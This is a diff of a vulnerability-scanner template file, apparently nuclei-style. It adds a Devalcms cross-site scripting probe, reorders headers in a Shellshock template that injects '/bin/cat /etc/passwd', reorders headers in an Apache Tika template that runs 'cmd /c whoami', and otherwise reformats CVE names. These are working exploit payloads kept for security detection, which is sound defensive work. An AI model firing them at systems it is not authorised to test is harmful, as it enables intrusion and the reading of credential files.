@@ -388,6 +388,21 @@
       ]
     },
     {
+      "id": "CVE-2008-6982",
+      "info": {
+        "name": "Devalcms 1.4a - Cross-Site Scripting",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-0545",
       "info": {
         "name": "ZeroShell <= 1.0beta11 Remote Code Execution",
@@ -3421,9 +3436,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6801,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -6940,7 +6955,7 @@
     {
       "id": "CVE-2018-14912",
       "info": {
-        "name": "cgit < 1.2.1 Directory Traversal",
+        "name": "cgit < 1.2.1 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -8556,7 +8571,7 @@
     {
       "id": "CVE-2019-10232",
       "info": {
-        "name": "Teclib GLPI <= 9.3.3 Unauthenticated SQL Injection",
+        "name": "Teclib GLPI <= 9.3.3 - Unauthenticated SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -8770,7 +8785,7 @@
     {
       "id": "CVE-2019-12314",
       "info": {
-        "name": "Deltek Maconomy 2.2.5 Local File Inclusion",
+        "name": "Deltek Maconomy 2.2.5 - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -8861,7 +8876,7 @@
     {
       "id": "CVE-2019-12725",
       "info": {
-        "name": "Zeroshell 3.9.0 Remote Command Execution",
+        "name": "Zeroshell 3.9.0 - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8894,7 +8909,7 @@
     {
       "id": "CVE-2019-13101",
       "info": {
-        "name": "D-Link DIR-600M Authentication Bypass",
+        "name": "D-Link DIR-600M - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -8908,7 +8923,7 @@
     {
       "id": "CVE-2019-13392",
       "info": {
-        "name": "MindPalette NateMail 3.0.15 Cross-Site Scripting",
+        "name": "MindPalette NateMail 3.0.15 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -9094,7 +9109,7 @@
     {
       "id": "CVE-2019-15107",
       "info": {
-        "name": "Webmin <= 1.920 Unauthenticated Remote Command Execution",
+        "name": "Webmin <= 1.920 - Unauthenticated Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9246,7 +9261,7 @@
     {
       "id": "CVE-2019-16313",
       "info": {
-        "name": "ifw8 Router ROM v4.31 Credential Discovery",
+        "name": "ifw8 Router ROM v4.31 - Credential Discovery",
         "severity": "high"
       },
       "requests": [
@@ -9306,7 +9321,7 @@
     {
       "id": "CVE-2019-16662",
       "info": {
-        "name": "rConfig 3.9.2 Remote Code Execution",
+        "name": "rConfig 3.9.2 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10604,7 +10619,7 @@
     {
       "id": "CVE-2020-10546",
       "info": {
-        "name": "rConfig 3.9.4 SQL Injection",
+        "name": "rConfig 3.9.4 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -10619,7 +10634,7 @@
     {
       "id": "CVE-2020-10547",
       "info": {
-        "name": "rConfig 3.9.4 SQL Injection",
+        "name": "rConfig 3.9.4 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -10891,7 +10906,7 @@
     {
       "id": "CVE-2020-11991",
       "info": {
-        "name": "Apache Cocoon 2.1.12 XML Injection",
+        "name": "Apache Cocoon 2.1.12 - XML Injection",
         "severity": "high"
       },
       "requests": [
@@ -11120,7 +11135,7 @@
     {
       "id": "CVE-2020-13700",
       "info": {
-        "name": "WordPresss acf-to-rest-api <=3.1.0- Insecure Direct Object Reference",
+        "name": "WordPresss acf-to-rest-api <=3.1.0 - Insecure Direct Object Reference",
         "severity": "high"
       },
       "requests": [
@@ -11165,7 +11180,7 @@
     {
       "id": "CVE-2020-13937",
       "info": {
-        "name": "Apache Kylin Exposed Configuration File",
+        "name": "Apache Kylin - Exposed Configuration File",
         "severity": "medium"
       },
       "requests": [
@@ -12302,7 +12317,7 @@
     {
       "id": "CVE-2020-25213",
       "info": {
-        "name": "WordPress File Manager Plugin Remote Code Execution",
+        "name": "WordPress File Manager Plugin - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12316,7 +12331,7 @@
     {
       "id": "CVE-2020-25223",
       "info": {
-        "name": "Sophos UTM Preauth Remote Code Execution",
+        "name": "Sophos UTM Preauth - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12345,7 +12360,7 @@
     {
       "id": "CVE-2020-25506",
       "info": {
-        "name": "D-Link DNS-320 Unauthenticated Remote Code Execution",
+        "name": "D-Link DNS-320 - Unauthenticated Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12360,7 +12375,7 @@
     {
       "id": "CVE-2020-2551",
       "info": {
-        "name": "Oracle WebLogic Server Remote Code Execution",
+        "name": "Oracle WebLogic Server - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -12957,7 +12972,7 @@
     {
       "id": "CVE-2020-35729",
       "info": {
-        "name": "Klog Server <=2.41- Unauthenticated Command Injection",
+        "name": "Klog Server <=2.41 - Unauthenticated Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -13032,7 +13047,7 @@
     {
       "id": "CVE-2020-35846",
       "info": {
-        "name": "Agentejo Cockpit < 0.11.2 NoSQL Injection",
+        "name": "Agentejo Cockpit < 0.11.2 - NoSQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -13051,7 +13066,7 @@
     {
       "id": "CVE-2020-35847",
       "info": {
-        "name": "Agentejo Cockpit <0.11.2 NoSQL Injection",
+        "name": "Agentejo Cockpit <0.11.2 - NoSQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14152,7 +14167,7 @@
     {
       "id": "CVE-2021-20114",
       "info": {
-        "name": "TCExam <= 14.8.1 Sensitive Information Exposure",
+        "name": "TCExam <= 14.8.1 - Sensitive Information Exposure",
         "severity": "high"
       },
       "requests": [
@@ -16749,7 +16764,7 @@
     {
       "id": "CVE-2021-31682",
       "info": {
-        "name": "WebCTRL OEM <= 6.5 Cross-Site Scripting",
+        "name": "WebCTRL OEM <= 6.5 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -17711,7 +17726,7 @@
     {
       "id": "CVE-2021-38751",
       "info": {
-        "name": "ExponentCMS <= 2.6 Host Header Injection",
+        "name": "ExponentCMS <= 2.6 - Host Header Injection",
         "severity": "medium"
       },
       "requests": [
@@ -17925,7 +17940,7 @@
     {
       "id": "CVE-2021-40438",
       "info": {
-        "name": "Apache <= 2.4.48 Mod_Proxy SSRF",
+        "name": "Apache <= 2.4.48 - Mod_Proxy SSRF",
         "severity": "critical"
       },
       "requests": [
@@ -18106,7 +18121,7 @@
     {
       "id": "CVE-2021-41174",
       "info": {
-        "name": "Grafana 8.0.0 <= v.8.2.2 Angularjs Rendering Cross-Site Scripting",
+        "name": "Grafana 8.0.0 <= v.8.2.2 - Angularjs Rendering Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -18743,7 +18758,7 @@
     {
       "id": "CVE-2021-43778",
       "info": {
-        "name": "GLPI plugin Barcode < 2.6.1 Path Traversal Vulnerability.",
+        "name": "GLPI plugin Barcode < 2.6.1 - Path Traversal Vulnerability.",
         "severity": "high"
       },
       "requests": [
@@ -18981,7 +18996,7 @@
     {
       "id": "CVE-2021-45232",
       "info": {
-        "name": "Apache APISIX Dashboard <2.10.1 API Unauthorized Access",
+        "name": "Apache APISIX Dashboard <2.10.1 - API Unauthorized Access",
         "severity": "critical"
       },
       "requests": [
